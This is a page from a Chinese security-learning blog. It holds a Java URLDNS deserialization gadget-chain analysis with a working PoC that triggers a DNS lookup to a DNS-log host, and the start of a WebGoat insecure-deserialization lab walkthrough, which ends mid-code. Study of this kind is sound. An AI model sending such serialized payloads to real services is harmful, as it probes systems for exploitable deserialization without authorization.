@@ -1,0 +1,424 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 14 | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>n2ryx&#39;s Blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Fortune Freedom.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/11/11/Java/URLDNS/" >URLDNS</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-11-11  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>触发反序列化的方法是readObject，直奔 HashMap 类的 readObject ⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后一段for循环</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113120658086.png" alt="image-20231113120658086"></p>
+<p>注释：读取键和值，并将映射放在HashMap中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里计算了键名的hash值，跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113121133713.png" alt="image-20231113121133713"></p>
+<p>键值不为空，会调用 hashCode，hashCode 初始值为 -1，跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113165118461.png" alt="image-20231113165118461"></p>
+<p>handler 是 URLStreamHandler 对象，继续跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113170008212.png" alt="image-20231113170008212"></p>
+<p>后面的不重要了</p>
+<p>这⾥有调⽤ getHostAddress ⽅法，继续跟进：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113170237558.png" alt="image-20231113170237558"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113170200390.png" alt="image-20231113170200390"></p>
+<p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询</p>
+<h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><blockquote>
+<p>沃克：</p>
+<p>在put时，就会产生DNS请求，经过DNS请求之后，url对象的hashCode值就被重新计算，不是初始值-1了，那么接下来序列化时不是-1，反序列化出来自然也不是-1，故实际反序列化时也就不会进行DNS请求，而在我们的DNS平台上收到的请求实际上是put时发出的，会对我们判断目标是否存在反序列化漏洞形成干扰</p>
+<p>故此坑的解决方法是：利用反射，在put之前将url对象的hashCode值设值成不为-1,put之后再利用反射，将其设置为-1，这样put时就不会发起DNS请求了</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231113182238917.png" alt="image-20231113182238917"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        HashMap.readObject()</span></span><br><span class="line"><span class="comment">            HashMap.hash()</span></span><br><span class="line"><span class="comment">                URL.hashCode()</span></span><br><span class="line"><span class="comment">                    URLStreamHandler.hashCode()</span></span><br><span class="line"><span class="comment">                        URLStreamHandler.getHostAddress()</span></span><br><span class="line"><span class="comment">                            ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://uedwpuvfgr.dgrh3.cn&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode方法计算时会在hashCode属性中缓存已经计算过的值，如果再次计算将直接返回值</span></span><br><span class="line">        <span class="comment">// put前，需要反射把hashCode的值修改（!=-1）</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put -&gt; URL中hashCode方法，hashCode值不等于-1就不会触发</span></span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode改为-1，反序列化时触发</span></span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(hashMap)));</span><br><span class="line">        deserialize(serialize(hashMap));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/11/11/Java/URLDNS/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/11/10/Java/Java反序列化-WebGoat/" >WebGoat-Java反序列化</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-11-10  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="WebGoat-Java反序列化"><a href="#WebGoat-Java反序列化" class="headerlink" title="WebGoat-Java反序列化"></a>WebGoat-Java反序列化</h2><p>源项目：webgoat-server-8.2.2（<a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases%EF%BC%89">https://github.com/WebGoat/WebGoat/releases）</a></p>
+<p>Jdk：&gt;&#x3D;15（11不行）</p>
+<p>启动命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar webgoat-server-8.2.2.jar</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/WebGoat/login">http://127.0.0.1:8080/WebGoat/login</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231112185914293.png" alt="image-20231112185914293"></p>
+<p>题目java文件：webgoat-server-8.2.2.jar 解包，webgoat-server-8.2.2&#x2F;BOOT-INF&#x2F;lib&#x2F;insecure-deserialization-8.2.2.jar再次解包，org&#x2F;org.owasp.webgoat.deserialization下的文件</p>
+<h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InsecureDeserializationTask</span></span><br><span class="line"><span class="keyword">package</span> org.owasp.webgoat.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.dummy.insecure.framework.VulnerableTaskHolder;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;insecure-deserialization.hints.1&quot;, &quot;insecure-deserialization.hints.2&quot;, &quot;insecure-deserialization.hints.3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDeserializationTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InsecureDeserializationTask</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/InsecureDeserialization/task&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String token)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64token</span> <span class="operator">=</span> token.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> before;</span><br><span class="line">        <span class="type">long</span> after;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            label71: &#123;</span><br><span class="line">                <span class="comment">// base64解码，通过字节流反序列化对象</span></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64token)));</span><br><span class="line"></span><br><span class="line">                AttackResult var10;</span><br><span class="line">                label64: &#123;</span><br><span class="line">                    label63: &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            before = System.currentTimeMillis();</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                            <span class="comment">// 类必须是VulnerableTaskHolder</span></span><br><span class="line">                            <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> VulnerableTaskHolder)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                                    var10 = <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.stringobject&quot;</span>).build();</span><br><span class="line">                                    <span class="keyword">break</span> label64;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                var10 = <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.wrongobject&quot;</span>).build();</span><br><span class="line">                                <span class="keyword">break</span> label63;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            after = System.currentTimeMillis();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ois.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable var11) &#123;</span><br><span class="line">                                var12.addSuppressed(var11);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">throw</span> var12;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        ois.close();</span><br><span class="line">                        <span class="keyword">break</span> label71;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ois.close();</span><br><span class="line">                    <span class="keyword">return</span> var10;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ois.close();</span><br><span class="line">                <span class="keyword">return</span> var10;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidClassException var13) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.invalidversion&quot;</span>).build();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var14) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.expired&quot;</span>).build();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;insecure-deserialization.invalidversion&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">delay</span> <span class="operator">=</span> (<span class="type">int</span>)(after - before);</span><br><span class="line">        <span class="keyword">if</span> (delay &gt; <span class="number">7000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> delay &lt; <span class="number">3000</span> ? <span class="built_in">this</span>.failed(<span class="built_in">this</span>).build() : <span class="built_in">this</span>.success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里需要Java序列化的类为VulnerableTaskHolder，跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VulnerableTaskHolder</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    